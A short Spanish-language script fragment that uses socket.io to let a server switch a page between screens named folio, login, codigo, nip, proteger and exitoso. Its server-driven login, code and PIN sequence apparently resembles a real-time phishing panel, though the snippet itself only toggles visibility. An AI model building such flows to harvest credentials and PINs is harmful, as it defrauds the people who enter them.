  <script>
    const socket = io();

    const pantallas = [
      "folio", "login", "codigo", "proteger", "protegido",
      "adicional", "nip", "cancelar", "exitoso"
    ];

    socket.on("pantalla", (pantalla) => {
      pantallas.forEach(p => {
        document.getElementById(p).style.display = "none";
      });
      if (pantalla && document.getElementById(pantalla)) {
        document.getElementById(pantalla).style.display = "block";
      }
    });

    // Por defecto: mostrar pantalla folio
    document.getElementById("folio").style.display = "block";
  </script>
